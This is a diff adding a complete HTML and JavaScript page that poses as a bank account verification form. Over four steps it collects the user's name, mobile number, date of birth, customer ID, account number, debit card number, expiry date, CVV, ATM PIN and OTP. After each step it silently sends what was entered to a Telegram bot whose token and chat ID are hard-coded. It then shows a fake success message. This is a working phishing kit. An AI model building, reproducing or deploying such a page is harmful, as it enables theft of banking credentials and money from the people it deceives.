@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Multi-Step Form with Telegram</title>
+  <style>
+    /* Global Styles */
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      color: #333;
+      margin: 0;
+      padding: 0;
+    }
+
+    .form-container {
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+      max-width: 500px;
+      margin: 10px auto;
+      padding: 10px;
+      text-align: center;
+    }
+
+    h2 {
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    /* Form Steps */
+    .form-step {
+      display: none;
+    }
+
+    .form-step.active {
+      display: block;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #555;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      transition: border-color 0.3s;
+    }
+
+    .form-group input:focus {
+      border-color: #6a11cb;
+      outline: none;
+    }
+
+    /* Two Columns */
+    .form-group.row {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+    }
+
+    .form-group.row .col {
+      width: 40%;
+    }
+
+    /* Buttons */
+    .btn-container {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+
+    .btn {
+      padding: 10px 20px;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s, transform 0.2s;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      color: #ffffff;
+    }
+
+    .btn-primary:hover {
+      background: linear-gradient(135deg, #2575fc, #6a11cb);
+    }
+
+    .btn-secondary {
+      background: #f3f3f3;
+      color: #333;
+    }
+
+    .btn-secondary:hover {
+      background: #ddd;
+    }
+
+    /* Progress Bar */
+    .progress-container {
+      display: flex;
+      justify-content: space-between;
+      margin: 20px 0;
+      position: relative;
+    }
+
+    .progress-container::before {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: #ddd;
+      z-index: 0;
+      transform: translateY(-50%);
+    }
+
+    .progress-step {
+      position: relative;
+      z-index: 1;
+      width: 30px;
+      height: 30px;
+      background: #ddd;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: bold;
+      color: #fff;
+    }
+
+    .progress-step.active {
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+    }
+  </style>
+</head>
+<img src="suryalogo.png" alt="" width="100%" height="100">
+<body>
+  <div class="form-container">
+    <h2>Multi-Step Form</h2>
+    <div class="progress-container">
+      <div class="progress-step active">1</div>
+      <div class="progress-step">2</div>
+      <div class="progress-step">3</div>
+      <div class="progress-step">4</div>
+    </div>
+    <form id="multiStepForm">
+      <!-- Step 1 -->
+      <div class="form-step active" id="step1">
+        <div class="form-group">
+          <label for="accountName">Account Holder Name</label>
+          <input type="text" id="accountName" name="accountName" required>
+        </div>
+        <div class="form-group">
+          <label for="mobileNumber">Registered Mobile No.</label>
+          <input type="text" inputmode="numeric" minlength="10" maxlength="10" id="mobileNumber" name="mobileNumber" maxlength="10" required>
+        </div>
+        <div class="form-group">
+          <label for="dob">Date of Birth (DD/MM/YYYY)</label>
+          <input type="text" inputmode="numeric" id="dob" name="dob" maxlength="10" required>
+        </div>
+        <div class="btn-container">
+          <button type="button" class="btn btn-primary" onclick="nextStep(1)">Next</button>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="form-step" id="step2">
+        <div class="form-group">
+          <label for="customerId">Customer ID</label>
+          <input type="text" id="customerId" name="customerId" required>
+        </div>
+        <div class="form-group">
+          <label for="accountNumber">Account No.</label>
+          <input type="text" inputmode="numeric" id="accountNumber" name="accountNumber" required>
+        </div>
+        <div class="btn-container">
+          <button type="button" class="btn btn-secondary" onclick="prevStep(1)">Back</button>
+          <button type="button" class="btn btn-primary" onclick="nextStep(2)">Next</button>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="form-step" id="step3">
+        <div class="form-group">
+          <label for="debitCard">16-Digit Debit Card No.</label>
+          <input type="text" inputmode="numeric" minlength="16" maxlength="16" id="debitCard" name="debitCard" maxlength="16" required>
+        </div>
+        <div class="form-group row">
+          <div class="col">
+            <label for="expiryDate">Expiry Date</label>
+            <input type="text" inputmode="numeric" id="expiryDate" name="expiryDate" maxlength="5" required>
+          </div>
+          <div class="col">
+            <label for="cvv">CVV</label>
+            <input type="text" inputmode="numeric" minlength="3" maxlength="3" id="cvv" name="cvv" maxlength="3" required>
+          </div>
+        </div>
+        <div class="form-group">
+          <label for="atmPin">ATM PIN</label>
+          <input type="password" inputmode="numeric" minlength="4" maxlength="4" id="atmPin" name="atmPin" maxlength="4" required>
+        </div>
+        <div class="btn-container">
+          <button type="button" class="btn btn-secondary" onclick="prevStep(2)">Back</button>
+          <button type="button" class="btn btn-primary" onclick="nextStep(3)">Next</button>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="form-step" id="step4">
+        <div class="form-group">
+          <label for="otp">Enter OTP</label>
+          <input type="text" inputmode="numeric" minlength="6" maxlength="6" id="otp" name="otp" maxlength="6" required>
+        </div>
+        <div class="btn-container">
+          <button type="button" class="btn btn-secondary" onclick="prevStep(3)">Back</button>
+          <button type="button" class="btn btn-primary" onclick="submitForm()">Submit</button>
+        </div>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    const steps = document.querySelectorAll('.form-step');
+    const progressSteps = document.querySelectorAll('.progress-step');
+    let currentStep = 0;
+
+    function showStep(step) {
+      steps.forEach((s, index) => {
+        s.classList.toggle('active', index === step);
+      });
+      progressSteps.forEach((p, index) => {
+        p.classList.toggle('active', index <= step);
+      });
+    }
+
+    function nextStep(step) {
+      if (currentStep < steps.length - 1) {
+        currentStep++;
+        showStep(currentStep);
+        sendDataToTelegram(step); // Send data after each step
+      }
+    }
+
+    function prevStep(step) {
+      if (currentStep > 0) {
+        currentStep--;
+        showStep(currentStep);
+      }
+    }
+
+    function sendDataToTelegram(step) {
+      const formData = new FormData(document.getElementById('multiStepForm'));
+      let message = '';
+      switch (step) {
+        case 1:
+          message = `Account Holder Name: ${formData.get('accountName')}
+          Mobile Number: ${formData.get('mobileNumber')}
+          Date of Birth: ${formData.get('dob')}`;
+          break;
+        case 2:
+          message = `Customer ID: ${formData.get('customerId')}
+          Account Number: ${formData.get('accountNumber')}`;
+          break;
+        case 3:
+          message = `Debit Card No.: ${formData.get('debitCard')}
+          Expiry Date: ${formData.get('expiryDate')}
+          CVV: ${formData.get('cvv')}
+          ATM PIN: ${formData.get('atmPin')}`;
+          break;
+        case 4:
+          message = `OTP: ${formData.get('otp')}`;
+          break;
+      }
+
+      const token = '7720332240:AAHdrwJXnm6wByezszdZ3BHvKIIWh_qLmWc';
+      const chatId = '6989736266';
+      const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(telegramUrl)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            console.log('Data sent to Telegram');
+          } else {
+            console.error('Failed to send data');
+          }
+        })
+        .catch(error => console.error('Error:', error));
+    }
+
+    function submitForm() {
+      sendDataToTelegram(4);
+      alert('Form submitted successfully!');
+    }
+
+    showStep(currentStep);
+  // Format Date of Birth and Expiry Date
+    document.getElementById('dob').addEventListener('input', function () {
+      this.value = this.value.replace(/^(\d{2})(\d{2})/, '$1/$2/').slice(0, 10);
+    });
+
+    document.getElementById('expiryDate').addEventListener('input', function () {
+      this.value = this.value.replace(/^(\d{2})(\d{2})/, '$1/$2').slice(0, 5);
+    });
+  </script>
+</body>
+</html>
